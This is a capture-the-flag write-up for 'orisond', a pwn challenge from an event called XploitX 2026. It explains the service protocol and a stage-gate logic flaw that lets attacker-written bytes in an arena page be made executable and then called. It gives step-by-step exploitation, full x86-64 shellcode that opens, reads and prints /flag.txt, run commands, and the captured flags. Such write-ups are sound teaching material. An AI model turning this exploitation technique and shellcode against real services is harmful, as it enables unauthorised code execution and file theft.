---
title: "Orisond"
description: "Binary protocol: u32 command | args, reply u32 status | u64 value (cmd 5 replies with two qwords: arena base + code pointer)."
event: "xploit"
category: "pwn"
categoryLabel: "Pwn"
tags: ["XploitX 2026","pwn"]
date: "2026-10-08"
teammate: false
source: "xploit/xploit-3/pwn/orisond/writeup.md"
---

**Binary:** `orisond` (x86-64, PIE, canary)
**Solve script:** `exp.py` (local + `--remote`, port 9015); `debug.py` = development harness
**Flags:**
- local: `NNS{local}`
- remote: `XploitXβ{orison_22_memstage_7c91e4a2_static}`

## Service

Binary protocol: `u32 command | args`, reply `u32 status | u64 value`
(`cmd 5` replies with two qwords: arena base + code pointer).

| cmd | args | action |
|-----|------|--------|
| 1 | — | `mmap()` a 2-page arena, RW (stage 0 → 1) |
| 5 | — | leak: replies `arena_base` and `default_stub` (→ PIE base) |
| 2 | `u32 page, u32 class` | set `page_class[page]` |
| 3 | `u32 page, u32 offset, u16 len, data` | write `len ≤ 0x200` bytes to `arena + page*0x1000 + offset` (allowed while the page is RW) |
| 4 | `u32 page` | `mprotect(page)` using its class — class 1 → `PROT_READ\|PROT_EXEC` (5) |
| 6 | `u32 page` | remap page `MAP_FIXED`, anonymous RW (stage → 6) |
| 7 | — | call the function pointer at `[arena+8]`, **gated on `stage > 5`** |

## Vulnerability

The service "catches you the moment you touch something you shouldn't" — but it
never checks *what the executable page contains*. The only gate on `cmd 7` is
the stage counter, and `cmd 6` advances the stage using **page 1**, leaving the
attacker-written contents of **page 0** untouched:

1. `cmd 5` leaks `arena` (for the code location) and `default_stub` (PIE).
2. `cmd 2 page=0, class=1` → page 0 is destined for `R-X`.
3. `cmd 3` writes the payload into page 0 **while it is still RW**:
   - `+0x00`: original magic `0x722` (keeps sanity checks happy)
   - `+0x08`: function pointer that `cmd 7` will call → `arena + 0x10`
   - `+0x10`: shellcode
   - `+0x100`: `"/flag.txt\0"`
4. `cmd 4 page=0` → `mprotect(R-X)` — our code is now executable.
5. `cmd 6 page=1` → remaps page 1 RW and pushes `stage` past the `cmd 7` gate
   without disturbing page 0.
6. `cmd 7` → calls `[arena+8]` → shellcode runs.

### Gotcha found during development

The first version put the shellcode's `read()` buffer at `arena+0x180`, i.e. in
page 0. After `cmd 4` page 0 is **R-X**, so `read(fd, buf, 128)` returned
**`-EFAULT`** (`open()` succeeded with fd 3, `read()` failed). The buffer must
live in RW memory — it is placed at `arena + 0x1100`, inside page 1, which
`cmd 6` has freshly remapped RW.

## Shellcode

```asm
endbr64
mov  eax, 2
movabs rdi, arena+0x100      ; "/flag.txt"
xor  esi, esi                ; O_RDONLY
xor  edx, edx
syscall                      ; open
mov  edi, eax
xor  eax, eax
movabs rsi, arena+0x1100     ; RW buffer (page 1)
mov  edx, 128
syscall                      ; read
mov  edx, eax
mov  eax, 1
mov  edi, 1
movabs rsi, arena+0x1100
syscall                      ; write(1, ...)
mov  eax, 60
xor  edi, edi
syscall                      ; exit(0)
```

## Run

```console
$ python3 exp.py            # local
$ python3 exp.py --remote   # xploitxctf.quest:9015
```

Remote output (after the 7 command replies):

```
=== shellcode output (46 bytes) ===
XploitXβ{orison_22_memstage_7c91e4a2_static}
```
